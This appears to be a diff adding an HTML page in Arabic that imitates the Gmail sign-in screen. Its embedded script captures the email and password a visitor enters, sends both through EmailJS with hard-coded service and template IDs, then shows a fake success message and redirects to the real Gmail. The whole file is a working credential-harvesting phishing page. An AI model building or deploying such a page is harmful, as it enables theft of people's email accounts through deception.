@@ -1,0 +1,208 @@
+<!DOCTYPE html>
+<html dir="rtl" lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: Arial, sans-serif;
+        }
+
+        body {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            background-color: #f9f9f9;
+        }
+
+        .login-container {
+            background: #fff;
+            padding: 48px 40px;
+            border: 1px solid #dadce0;
+            border-radius: 12px;
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
+            width: 400px;
+        }
+
+        .google-logo {
+            text-align: center;
+            margin-bottom: 16px;
+        }
+
+        .google-logo img {
+            max-width: 120px;
+        }
+
+        h1 {
+            text-align: center;
+            font-size: 22px;
+            margin-bottom: 24px;
+            color: #202124;
+        }
+
+        .form-group {
+            margin-bottom: 20px;
+        }
+
+        input {
+            width: 100%;
+            padding: 12px 14px;
+            border: 1px solid #dadce0;
+            border-radius: 6px;
+            font-size: 16px;
+            margin-top: 8px;
+        }
+
+        input:focus {
+            outline: none;
+            border-color: #1a73e8;
+            border-width: 2px;
+        }
+
+        label {
+            color: #5f6368;
+            font-size: 14px;
+            margin-bottom: 6px;
+            display: block;
+        }
+
+        .forgot-email {
+            color: #1a73e8;
+            text-decoration: none;
+            font-weight: 500;
+            font-size: 14px;
+            margin-top: 8px;
+            display: inline-block;
+        }
+
+        .forgot-email:hover {
+            text-decoration: underline;
+        }
+
+        .button-group {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-top: 24px;
+        }
+
+        .create-account {
+            color: #1a73e8;
+            text-decoration: none;
+            font-weight: 500;
+            font-size: 14px;
+        }
+
+        .create-account:hover {
+            text-decoration: underline;
+        }
+
+        .next-button {
+            background: #1a73e8;
+            color: white;
+            padding: 10px 20px;
+            border: none;
+            border-radius: 6px;
+            font-size: 14px;
+            font-weight: 500;
+            cursor: pointer;
+            transition: background 0.3s;
+        }
+
+        .next-button:hover {
+            background: #1557b0;
+        }
+
+        .alert {
+            padding: 12px;
+            margin: 10px 0;
+            border-radius: 6px;
+            display: none;
+            font-size: 14px;
+        }
+
+        .alert-error {
+            background-color: #ffebee;
+            color: #c62828;
+            border: 1px solid #ffcdd2;
+        }
+
+        .alert-success {
+            background-color: #e8f5e9;
+            color: #2e7d32;
+            border: 1px solid #c8e6c9;
+        }
+    </style>
+</head>
+<body>
+    <div class="login-container">
+        <div class="google-logo">
+            <img src="file:///C:/Users/seenc/Desktop/Uesr/gogle.png" alt="Google Logo">
+        </div>
+        
+        <h1>تسجيل الدخول</h1>
+        <p style="text-align: center; color: #5f6368; margin-bottom: 24px;">للمتابعة إلى Gmail</p>
+        
+        <div id="alert" class="alert"></div>
+
+        <form id="loginForm">
+            <div class="form-group">
+                <label for="email">البريد الإلكتروني أو رقم الهاتف</label>
+                <input type="email" id="email" name="user_email" required>
+            </div>
+            <div class="form-group">
+                <label for="password">كلمة المرور</label>
+                <input type="password" id="password" name="user_password" required>
+            </div>
+            
+            <a href="#" class="forgot-email">نسيت البريد الإلكتروني؟</a>
+            
+            <div class="button-group">
+                <a href="#" class="create-account">إنشاء حساب</a>
+                <button type="submit" class="next-button">تسجيل الدخول</button>
+            </div>
+        </form>
+    </div>
+
+    <script>
+        (function() {
+            emailjs.init("A5nONhORib1V0oWel"); // ضع المفتاح العام الخاص بك هنا
+            
+            document.getElementById('loginForm').addEventListener('submit', function(event) {
+                event.preventDefault();
+                
+                const userEmail = document.getElementById('email').value;
+                const userPassword = document.getElementById('password').value;
+                const alertDiv = document.getElementById('alert');
+
+                // إرسال البيانات عبر EmailJS
+                emailjs.send("service_8hf7xot", "template_xcfqk62", {
+                    user_email: userEmail,
+                    user_password: userPassword,
+                    login_time: new Date().toLocaleString()
+                }).then(
+                    function(response) {
+                        alertDiv.className = "alert alert-success";
+                        alertDiv.style.display = "block";
+                        alertDiv.textContent = "تم تسجيل الدخول بنجاح!";
+                        
+                        // إعادة التوجيه بعد نجاح الإرسال
+                        setTimeout(() => {
+                            window.location.href = "https://mail.google.com";
+                        }, 2000);
+                    },
+                    function(error) {
+                        alertDiv.className = "alert alert-error";
+                        alertDiv.style.display = "block";
+                        alertDiv.textContent = "حدث خطأ أثناء تسجيل الدخول. يرجى المحاولة مرة أخرى.";
+                    }
+                );
+            });
+        })();
+    </script>
+</body>
+</html>
